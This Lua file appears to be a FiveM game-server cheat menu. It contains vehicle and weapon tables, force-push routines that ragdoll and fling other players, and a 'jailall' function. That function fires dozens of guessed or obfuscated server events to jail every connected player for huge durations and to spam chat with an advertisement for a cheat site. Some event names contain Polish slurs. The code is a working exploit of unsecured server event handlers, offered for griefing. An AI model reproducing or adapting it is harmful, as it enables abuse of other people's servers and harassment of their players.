    local muscle = { "Blade", "Buccaneer", "Buccaneer2", "Chino", "Chino2", "clique", "Deviant", "Dominator", "Dominator2", "Dominator3", "Dominator4", "Dominator5", "Dominator6", "Dukes", "Dukes2", "Ellie", "Faction", "faction2", "faction3", "Gauntlet", "Gauntlet2", "Hermes", "Hotknife", "Hustler", "Impaler", "Impaler2", "Impaler3", "Impaler4", "Imperator", "Imperator2", "Imperator3", "Lurcher", "Moonbeam", "Moonbeam2", "Nightshade", "Phoenix", "Picador", "RatLoader", "RatLoader2", "Ruiner", "Ruiner2", "Ruiner3", "SabreGT", "SabreGT2", "Sadler2", "Slamvan", "Slamvan2", "Slamvan3", "Slamvan4", "Slamvan5", "Slamvan6", "Stalion", "Stalion2", "Tampa", "Tampa3", "Tulip", "Vamos,", "Vigero", "Virgo", "Virgo2", "Virgo3", "Voodoo", "Voodoo2", "Yosemite"}
    local OffRoad = {"BFinjection", "Bifta", "Blazer", "Blazer2", "Blazer3", "Blazer5", "Bohdi", "Brawler", "Bruiser", "Bruiser2", "Bruiser3", "Caracara", "DLoader", "Dune", "Dune2", "Dune3", "Dune4", "Dune5", "Insurgent", "Insurgent2", "Insurgent3", "Kalahari", "Kamacho", "LGuard", "Marshall", "Mesa", "Mesa2", "Mesa3", "Monster", "Monster4", "Monster5", "Nightshark", "RancherXL", "RancherXL2", "Rebel", "Rebel2", "RCBandito", "Riata", "Sandking", "Sandking2", "Technical", "Technical2", "Technical3", "TrophyTruck", "TrophyTruck2", "Freecrawler", "Menacer"}
    local Planes = {"AlphaZ1", "Avenger", "Avenger2", "Besra", "Blimp", "blimp2", "Blimp3", "Bombushka", "Cargoplane", "Cuban800", "Dodo", "Duster", "Howard", "Hydra", "Jet", "Lazer", "Luxor", "Luxor2", "Mammatus", "Microlight", "Miljet", "Mogul", "Molotok", "Nimbus", "Nokota", "Pyro", "Rogue", "Seabreeze", "Shamal", "Starling", "Stunt", "Titan", "Tula", "Velum", "Velum2", "Vestra", "Volatol", "Striekforce"}
    local SUVs = {"BJXL", "Baller", "Baller2", "Baller3", "Baller4", "Baller5", "Baller6", "Cavalcade", "Cavalcade2", "Dubsta", "Dubsta2", "Dubsta3", "FQ2", "Granger", "Gresley", "Habanero", "Huntley", "Landstalker", "patriot", "Patriot2", "Radi", "Rocoto", "Seminole", "Serrano", "Toros", "XLS", "XLS2"}
    local Sedans = {"Asea", "Asea2", "Asterope", "Cog55", "Cogg552", "Cognoscenti", "Cognoscenti2", "emperor", "emperor2", "emperor3", "Fugitive", "Glendale", "ingot", "intruder", "limo2", "premier", "primo", "primo2", "regina", "romero", "stafford", "Stanier", "stratum", "stretch", "surge", "tailgater", "warrener", "Washington"}
    local Service = { "Airbus", "Brickade", "Bus", "Coach", "Rallytruck", "Rentalbus", "Taxi", "Tourbus", "Trash", "Trash2", "WastIndr", "PBus2"}
    local Sports = {"Alpha", "Banshee", "Banshee2", "BestiaGTS", "Buffalo", "Buffalo2", "Buffalo3", "Carbonizzare", "Comet2", "Comet3", "Comet4", "Comet5", "Coquette", "Deveste", "Elegy", "Elegy2", "Feltzer2", "Feltzer3", "FlashGT", "Furoregt", "Fusilade", "Futo", "GB200", "Hotring", "Infernus2", "Italigto", "Jester", "Jester2", "Khamelion", "Kurama", "Kurama2", "Lynx", "MAssacro", "MAssacro2", "neon", "Ninef", "ninfe2", "omnis", "Pariah", "Penumbra", "Raiden", "RapidGT", "RapidGT2", "Raptor", "Revolter", "Ruston", "Schafter2", "Schafter3", "Schafter4", "Schafter5", "Schafter6", "Schlagen", "Schwarzer", "Sentinel3", "Seven70", "Specter", "Specter2", "Streiter", "Sultan", "Surano", "Tampa2", "Tropos", "Verlierer2", "ZR380", "ZR3802", "ZR3803"}
    local SportsClassic = {"Ardent", "BType", "BType2", "BType3", "Casco", "Cheetah2", "Cheburek", "Coquette2", "Coquette3", "Deluxo", "Fagaloa", "Gt500", "JB700", "JEster3", "MAmba", "Manana", "Michelli", "Monroe", "Peyote", "Pigalle", "RapidGT3", "Retinue", "Savastra", "Stinger", "Stingergt", "Stromberg", "Swinger", "Torero", "Tornado", "Tornado2", "Tornado3", "Tornado4", "Tornado5", "Tornado6", "Viseris", "Z190", "ZType"}
    local Super = {"Adder", "Autarch", "Bullet", "Cheetah", "Cyclone", "EntityXF", "Entity2", "FMJ", "GP1", "Infernus", "LE7B", "Nero", "Nero2", "Osiris", "Penetrator", "PFister811", "Prototipo", "Reaper", "SC1", "Scramjet", "Sheava", "SultanRS", "Superd", "T20", "Taipan", "Tempesta", "Tezeract", "Turismo2", "Turismor", "Tyrant", "Tyrus", "Vacca", "Vagner", "Vigilante", "Visione", "Voltic", "Voltic2", "Zentorno", "Italigtb", "Italigtb2", "XA21"}
    local Trailer = { "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"}
    local trains = {"Freight", "Freightcar", "Freightcont1", "Freightcont2", "Freightgrain", "Freighttrailer", "TankerCar"}
    local Utility = {"Airtug", "Caddy", "Caddy2", "Caddy3", "Docktug", "Forklift", "Mower", "Ripley", "Sadler", "Scrap", "TowTruck", "Towtruck2", "Tractor", "Tractor2", "Tractor3", "TrailerLArge2", "Utilitruck", "Utilitruck3", "Utilitruck2"}
    local Vans = {"Bison", "Bison2", "Bison3", "BobcatXL", "Boxville", "Boxville2", "Boxville3", "Boxville4", "Boxville5", "Burrito", "Burrito2", "Burrito3", "Burrito4", "Burrito5", "Camper", "GBurrito", "GBurrito2", "Journey", "Minivan", "Minivan2", "Paradise", "pony", "Pony2", "Rumpo", "Rumpo2", "Rumpo3", "Speedo", "Speedo2", "Speedo4", "Surfer", "Surfer2", "Taco", "Youga", "youga2"}
    local CarTypes = {"Boats", "Commercial", "Compacts", "Coupes", "Cycles", "Emergency", "Helictopers", "Industrial", "Military", "Motorcycles", "Muscle", "Off-Road", "Planes", "SUVs", "Sedans", "Service", "Sports", "Sports Classic", "Super", "Trailer", "Trains", "Utility", "Vans"}
    local CarsArray = { boats, Commercial, Compacts, Coupes, cycles, Emergency, Helicopters, Industrial, Military, Motorcycles, muscle, OffRoad, Planes, SUVs, Sedans, Service, Sports, SportsClassic, Super, Trailer, trains, Utility, Vans}
    local Trailers = { "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"}
    local allWeapons={"WEAPON_KNIFE","WEAPON_KNUCKLE","WEAPON_NIGHTSTICK","WEAPON_HAMMER","WEAPON_BAT","WEAPON_GOLFCLUB","WEAPON_CROWBAR","WEAPON_BOTTLE","WEAPON_DAGGER","WEAPON_HATCHET","WEAPON_MACHETE","WEAPON_FLASHLIGHT","WEAPON_SWITCHBLADE","WEAPON_PISTOL","WEAPON_PISTOL_MK2","WEAPON_COMBATPISTOL","WEAPON_APPISTOL","WEAPON_PISTOL50","WEAPON_SNSPISTOL","WEAPON_HEAVYPISTOL","WEAPON_VINTAGEPISTOL","WEAPON_STUNGUN","WEAPON_FLAREGUN","WEAPON_MARKSMANPISTOL","WEAPON_REVOLVER","WEAPON_MICROSMG","WEAPON_SMG","WEAPON_SMG_MK2","WEAPON_ASSAULTSMG","WEAPON_MG","WEAPON_COMBATMG","WEAPON_COMBATMG_MK2","WEAPON_COMBATPDW","WEAPON_GUSENBERG","WEAPON_MACHINEPISTOL","WEAPON_ASSAULTRIFLE","WEAPON_ASSAULTRIFLE_MK2","WEAPON_CARBINERIFLE","WEAPON_CARBINERIFLE_MK2","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE","WEAPON_BULLPUPRIFLE","WEAPON_COMPACTRIFLE","WEAPON_PUMPSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_BULLPUPSHOTGUN","WEAPON_ASSAULTSHOTGUN","WEAPON_MUSKET","WEAPON_HEAVYSHOTGUN","WEAPON_DBSHOTGUN","WEAPON_SNIPERRIFLE","WEAPON_HEAVYSNIPER","WEAPON_HEAVYSNIPER_MK2","WEAPON_MARKSMANRIFLE","WEAPON_GRENADELAUNCHER","WEAPON_GRENADELAUNCHER_SMOKE","WEAPON_RPG","WEAPON_STINGER","WEAPON_FIREWORK","WEAPON_HOMINGLAUNCHER","WEAPON_GRENADE","WEAPON_STICKYBOMB","WEAPON_PROXMINE","WEAPON_BZGAS","WEAPON_SMOKEGRENADE","WEAPON_MOLOTOV","WEAPON_FIREEXTINGUISHER","WEAPON_PETROLCAN","WEAPON_SNOWBALL","WEAPON_FLARE","WEAPON_BALL"}
    local FirstJoinProper = false
    local near = false
    local closed = false
    local insideGarage = false
    local currentGarage = nil
    local insidePosition = {}
    local outsidePosition = {}
    local oldrot = nil
    local isPreviewing = false
    local oldmod = -1
    local oldmodtype = -1
    local previewmod = -1
    local oldmodaction = false
    local vehicleMods={{name="Spoilers",id=0},{name="Front Bumper",id=1},{name="Rear Bumper",id=2},{name="Side Skirt",id=3},{name="Exhaust",id=4},{name="Frame",id=5},{name="Grille",id=6},{name="Hood",id=7},{name="Fender",id=8},{name="Right Fender",id=9},{name="Roof",id=10},{name="Vanity Plates",id=25},{name="Trim",id=27},{name="Ornaments",id=28},{name="Dashboard",id=29},{name="Dial",id=30},{name="Door Speaker",id=31},{name="Seats",id=32},{name="Steering Wheel",id=33},{name="Shifter Leavers",id=34},{name="Plaques",id=35},{name="Speakers",id=36},{name="Trunk",id=37},{name="Hydraulics",id=38},{name="Engine Block",id=39},{name="Air Filter",id=40},{name="Struts",id=41},{name="Arch Cover",id=42},{name="Aerials",id=43},{name="Trim 2",id=44},{name="Tank",id=45},{name="Windows",id=46},{name="Livery",id=48},{name="Horns",id=14},{name="Wheels",id=23},{name="Wheel Types",id="wheeltypes"},{name="Extras",id="extra"},{name="Neons",id="neon"},{name="Paint",id="paint"},{name="Headlights Color",id="headlight"},{name="Licence Plate",id="licence"}}
    local perfMods={{name = "~r~Engine", id = 11},{name = "~b~Brakes", id = 12},{name = "~g~Transmission", id = 13},{name = "~y~Suspension", id = 15},{name = "~b~Armor", id = 16},}
    local licencetype={{name="Blue on White 2",id=0},{name="Blue on White 3",id=4},{name="Yellow on Blue",id=2},{name="Yellow on Black",id=1},{name="North Yankton",id=5}}
    local headlightscolor={{name="Default",id=-1},{name="White",id=0},{name="Blue",id=1},{name="Electric Blue",id=2},{name="Mint Green",id=3},{name="Lime Green",id=4},{name="Yellow",id=5},{name="Golden Shower",id=6},{name="Orange",id=7},{name="Red",id=8},{name="Pony Pink",id=9},{name="Hot Pink",id=10},{name="Purple",id=11},{name="Blacklight",id=12}}
    local horns={["Stock Horn"]=-1,["Truck Horn"]=1,["Police Horn"]=2,["Clown Horn"]=3,["Musical Horn 1"]=4,["Musical Horn 2"]=5,["Musical Horn 3"]=6,["Musical Horn 4"]=7,["Musical Horn 5"]=8,["Sad Trombone Horn"]=9,["Classical Horn 1"]=10,["Classical Horn 2"]=11,["Classical Horn 3"]=12,["Classical Horn 4"]=13,["Classical Horn 5"]=14,["Classical Horn 6"]=15,["Classical Horn 7"]=16,["Scaledo Horn"]=17,["Scalere Horn"]=18,["Salemi Horn"]=19,["Scalefa Horn"]=20,["Scalesol Horn"]=21,["Scalela Horn"]=22,["Scaleti Horn"]=23,["Scaledo Horn High"]=24,["Jazz Horn 1"]=25,["Jazz Horn 2"]=26,["Jazz Horn 3"]=27,["Jazz Loop Horn"]=28,["Starspangban Horn 1"]=28,["Starspangban Horn 2"]=29,["Starspangban Horn 3"]=30,["Starspangban Horn 4"]=31,["Classical Loop 1"]=32,["Classical Horn 8"]=33,["Classical Loop 2"]=34}
    local neonColors={["White"]={255,255,255},["Blue"]={0,0,255},["Electric Blue"]={0,150,255},["Mint Green"]={50,255,155},["Lime Green"]={0,255,0},["Yellow"]={255,255,0},["Golden Shower"]={204,204,0},["Orange"]={255,128,0},["Red"]={255,0,0},["Pony Pink"]={255,102,255},["Hot Pink"]={255,0,255},["Purple"]={153,0,153}}
    local paintsClassic={{name="Black",id=0},{name="Carbon Black",id=147},{name="Graphite",id=1},{name="Anhracite Black",id=11},{name="Black Steel",id=2},{name="Dark Steel",id=3},{name="Silver",id=4},{name="Bluish Silver",id=5},{name="Rolled Steel",id=6},{name="Shadow Silver",id=7},{name="Stone Silver",id=8},{name="Midnight Silver",id=9},{name="Cast Iron Silver",id=10},{name="Red",id=27},{name="Torino Red",id=28},{name="Formula Red",id=29},{name="Lava Red",id=150},{name="Blaze Red",id=30},{name="Grace Red",id=31},{name="Garnet Red",id=32},{name="Sunset Red",id=33},{name="Cabernet Red",id=34},{name="Wine Red",id=143},{name="Candy Red",id=35},{name="Hot Pink",id=135},{name="Pfsiter Pink",id=137},{name="Salmon Pink",id=136},{name="Sunrise Orange",id=36},{name="Orange",id=38},{name="Bright Orange",id=138},{name="Gold",id=99},{name="Bronze",id=90},{name="Yellow",id=88},{name="Race Yellow",id=89},{name="Dew Yellow",id=91},{name="Dark Green",id=49},{name="Racing Green",id=50},{name="Sea Green",id=51},{name="Olive Green",id=52},{name="Bright Green",id=53},{name="Gasoline Green",id=54},{name="Lime Green",id=92},{name="Midnight Blue",id=141},{name="Galaxy Blue",id=61},{name="Dark Blue",id=62},{name="Saxon Blue",id=63},{name="Blue",id=64},{name="Mariner Blue",id=65},{name="Harbor Blue",id=66},{name="Diamond Blue",id=67},{name="Surf Blue",id=68},{name="Nautical Blue",id=69},{name="Racing Blue",id=73},{name="Ultra Blue",id=70},{name="Light Blue",id=74},{name="Chocolate Brown",id=96},{name="Bison Brown",id=101},{name="Creeen Brown",id=95},{name="Feltzer Brown",id=94},{name="Maple Brown",id=97},{name="Beechwood Brown",id=103},{name="Sienna Brown",id=104},{name="Saddle Brown",id=98},{name="Moss Brown",id=100},{name="Woodbeech Brown",id=102},{name="Straw Brown",id=99},{name="Sandy Brown",id=105},{name="Bleached Brown",id=106},{name="Schafter Purple",id=71},{name="Spinnaker Purple",id=72},{name="Midnight Purple",id=142},{name="Bright Purple",id=145},{name="Cream",id=107},{name="Ice White",id=111},{name="Frost White",id=112}}
    local paintsMatte={{name="Black",id=12},{name="Gray",id=13},{name="Light Gray",id=14},{name="Ice White",id=131},{name="Blue",id=83},{name="Dark Blue",id=82},{name="Midnight Blue",id=84},{name="Midnight Purple",id=149},{name="Schafter Purple",id=148},{name="Red",id=39},{name="Dark Red",id=40},{name="Orange",id=41},{name="Yellow",id=42},{name="Lime Green",id=55},{name="Green",id=128},{name="Forest Green",id=151},{name="Foliage Green",id=155},{name="Olive Darb",id=152},{name="Dark Earth",id=153},{name="Desert Tan",id=154}}
    local paintsMetal={{name="Brushed Steel",id=117},{name="Brushed Black Steel",id=118},{name="Brushed Aluminum",id=119},{name="Pure Gold",id=158},{name="Brushed Gold",id=159}}
    defaultVehAction = ""
    if GetVehiclePedIsUsing(PlayerPedId()) then
      veh = GetVehiclePedIsUsing(PlayerPedId())
    end

    local Enabled = true
    local LynxIcS = "LynxX"
    local LynxIcZ = "https://dc.xaries.pl"
    local sMX = "SelfMenu"
    local sMXS = "Self Menu"
    local LMX = "LuaMenu"
    local VRPT = "VRPTriggers"
    local TRPM = "TeleportMenu"
    local WMPS = "WeaponMenu"
    local advm = "AdvM"
    local VMS = "VehicleMenu"
    local OPMS = "OnlinePlayerMenu"
    local poms = "PlayerOptionsMenu"
    local dddd = "Destroyer"
    local esms = "ESXMoney"
    local crds = "Credits"
    local MSTC = "MiscTriggers"
    local cAoP = "CarOptions"
    local MTS = "MainTrailer"
    local mtsl = "MainTrailerSel"
    local LSCC = "LSC"
    local espa = "ESPMenu"
    local CMSMS = "CsMenu"
    local gccccc = "GCT"
    local GAPA = "GlobalAllPlayers"
    local Tmas = "Trollmenu"
    local ESXC = "ESXCustom"
    local ESXD = "ESXDrugs"
	local SEVR = "PLServers"
	local MoneyP = "Moneypp"
	local TrollP = "Trollpp"
	local AvizonRPM = "AvizonRPM1"
	local AvizonRPT = "AvizonRPT2"
	local MoroRPT = "MoroRPT2"
	local MoroRPM = "MoroRPM1"
    local SPD = "SpawnPeds"
    local bmm = "BoostMenu"
    local prof = "performance"
    local tngns = "tunings"
    local GSWP = "GiveSingleWeaponPlayer"
    local WOP = "WeaponOptions"
    local CTS = "CarTypeSelection"
    local CTSmtsps = "MainTrailerSpa"
    local CTSa = "CarTypes"
    local MSMSA = "ModSelect"
    local WTSbull = "WeaponTypeSelection"
    local WTNe = "WeaponTypes"

    local function DrawTxt(text, x, y)
      SetTextFont(1)
      SetTextProportional(1)
      SetTextScale(0.0, 0.6)
      SetTextDropshadow(1, 0, 0, 0, 255)
      SetTextEdge(1, 0, 0, 0, 255)
      SetTextDropShadow()
      SetTextOutline()
      SetTextEntry("STRING")
      AddTextComponentString(text)
      DrawText(x, y)
    end

    function RequestModelSync(mod)
      local model = GetHashKey(mod)
      RequestModel(model)
      while not HasModelLoaded(model) do
        RequestModel(model)
        Citizen.Wait(0)
      end
    end

    function ApplyShockwave(entity)
      local pos = GetEntityCoords(PlayerPedId())
      local coord=GetEntityCoords(entity)
      local dx=coord.x - pos.x
      local dy=coord.y - pos.y
      local dz=coord.z - pos.z
      local distance=math.sqrt(dx*dx+dy*dy+dz*dz)
      local distanceRate=(50/distance)*math.pow(1.04,1-distance)
      ApplyForceToEntity(entity, 1, distanceRate*dx,distanceRate*dy,distanceRate*dz, math.random()*math.random(-1,1),math.random()*math.random(-1,1),math.random()*math.random(-1,1), true, false, true, true, true, true)
    end

    local function DoJesusTick(radius)
      local player = PlayerPedId()
      local coords = GetEntityCoords(PlayerPedId())
      local playerVehicle = GetPlayersLastVehicle()
      local inVehicle=IsPedInVehicle(player,playerVehicle,true)

      DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, 180, 80, 0, 35, false, true, 2, nil, nil, false)

      for k in EnumerateVehicles() do
        if (not inVehicle or k ~= playerVehicle) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius*1.2 then
          RequestControlOnce(k)
          ApplyShockwave(k)
        end
      end

      for k in EnumeratePeds() do
        if k~= PlayerPedId() and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius*1.2 then
          RequestControlOnce(k)
          SetPedRagdollOnCollision(k,true)
          SetPedRagdollForceFall(k)
          ApplyShockwave(k)
        end
      end
    end

    local function DRFT()
      DisablePlayerFiring(PlayerPedId(), true)
      if IsDisabledControlPressed(0, 24) then
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
        local camDir = GetCamDirFromScreenCenter()
        local camPos = GetGameplayCamCoord()
        local launchPos = GetEntityCoords(wepent)
        local targetPos = camPos + (camDir * 200.0)

        ClearAreaOfProjectiles(launchPos, 0.0, 1)

        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
      end
    end



    local function MagnetoBoy()
      magnet = not magnet

      if magnet then

        Citizen.CreateThread(function()
        notify("~h~Wcisnij ~r~E ~s~aby uzyc")

        local ForceKey = 38
        local Force = 0.5
        local KeyPressed = false
        local KeyTimer = 0
        local KeyDelay = 15
        local ForceEnabled = false
        local StartPush = false

        function forcetick()

          if (KeyPressed) then
            KeyTimer = KeyTimer + 1
            if(KeyTimer >= KeyDelay) then
              KeyTimer = 0
              KeyPressed = false
            end
          end



          if IsControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
            KeyPressed = true
            ForceEnabled = true
          end

          if (StartPush) then

            StartPush = false
            local pid = PlayerPedId()
            local CamRot = GetGameplayCamRot(2)

            local force = 5

            local Fx = -( math.sin(math.rad(CamRot.z)) * force*10 )
            local Fy = ( math.cos(math.rad(CamRot.z)) * force*10 )
            local Fz = force * (CamRot.x*0.2)

            local PlayerVeh = GetVehiclePedIsIn(pid, false)

            for k in EnumerateVehicles() do
              SetEntityInvincible(k, false)
              if IsEntityOnScreen(k) and k ~= PlayerVeh then
                ApplyForceToEntity(k, 1, Fx, Fy,Fz, 0,0,0, true, false, true, true, true, true)
              end
            end

            for k in EnumeratePeds() do
              if IsEntityOnScreen(k) and k ~= pid then
                ApplyForceToEntity(k, 1, Fx, Fy,Fz, 0,0,0, true, false, true, true, true, true)
              end
            end

          end


          if IsControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
            KeyPressed = true
            StartPush = true
            ForceEnabled = false
          end

          if (ForceEnabled) then
            local pid = PlayerPedId()
            local PlayerVeh = GetVehiclePedIsIn(pid, false)

            Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)

            DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 180, 0, 0, 35, false, true, 2, nil, nil, false)

            for k in EnumerateVehicles() do
              SetEntityInvincible(k, true)
              if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
                RequestControlOnce(k)
                FreezeEntityPosition(k, false)
                Oscillate(k, Markerloc, 0.5, 0.3)
              end
            end

            for k in EnumeratePeds() do
              if IsEntityOnScreen(k) and k ~= PlayerPedId() then
                RequestControlOnce(k)
                SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
                FreezeEntityPosition(k, false)
                Oscillate(k, Markerloc, 0.5, 0.3)
              end
            end

          end

        end

        while magnet do forcetick() Wait(0) end
          end)
        else notify("~r~~h~Wylaczone")
        end

      end


      local function jailall()
        local pbase = GetActivePlayers()
        for i=0, 256 do
          		TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "Jailed")
                TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
                TSE("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
                TSE("js:jailuser", GetPlayerServerId(i), 45 * 60, "Jailed")
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
				TSE("js:jailuser", GetPlayerServerId(i), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx_jailer:sendToJail132", GetPlayerServerId(i), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:*", GetPlayerServerId(i), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:eloelo90", GetPlayerServerId(i), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:wwiezienie", GetPlayerServerId(i), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("searp:sendToJail", GetPlayerServerId(i), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("wyspa_jail:SendMessage", GetPlayerServerId(i), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx_jebackoguszkaa_jailer:sendToJail", GetPlayerServerId(i), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:sendToJailhype", GetPlayerServerId(i), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(i), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:sendToJailtrop", GetPlayerServerId(i), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432, 'SenseiToUjJebanyWDupeCfelPierdolony1337Kurwo')
				TSE("17A34C820A685513C5B4ADDD85968B9E905CC300A261EB55D299ABCB6C90AAA872712B3B6C13DC41913FCC2BE84A07EF9300DC4E89669A4B0E6FBB344A69D239", GetPlayerServerId(i), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:sendToJail132", GetPlayerServerId(i), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:fabianfudalijebanyprzyglup", GetPlayerServerId(i), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jebackoguszkaa_jailer:sendToJail", GetPlayerServerId(i), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9999999999)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9999999999)
				TSE("esx-jail:jailPlayer",   GetPlayerServerId(i), 3000)
				TSE("esx_jailer:jailhype", GetPlayerServerId(i), 3000)
				TSE("esx_jailer:sendToJial", GetPlayerServerId(i), 59999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D?", 9333397)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 59999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D?", 9333397)
				TSE("esx-jail:jailPlayer", GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9999999999)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9999999999)
				TSE("esx_policejob:message", GetPlayerServerId(i), "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("hazerp:wyslijdopaki", GetPlayerServerId(i), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				TSE("8321hiue89js", GetPlayerServerId(i), 5007, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 323434532532, securityToken)
				TSE("esx_jailer:sendToJailjebacdisafrajerze", GetPlayerServerId(i), 300000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 500324532)
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 999999999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("js:jailuser", GetPlayerServerId(i), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 300)
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("js:jailuser", GetPlayerServerId(i), 5000, "dude weed")
				TSE('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .." https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE('esx_policejob:zakujtypeczka',  GetPlayerServerId(i))
				TSE('esx_ruski_areszt:startAreszt', GetPlayerServerId(i))
				TSE("arisonarp:wiezienie", GetPlayerServerId(i), 9999999999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1337)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 9999999 * 60)
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 9999999 * 60)
				TSE("js:jailuser", GetPlayerServerId(i), 999999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 999999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("wysparp_tablet:SendMessage", GetPlayerServerId(i), 9999 * 60, "FAJNY TEN ANTY LYNX", 9999999999)
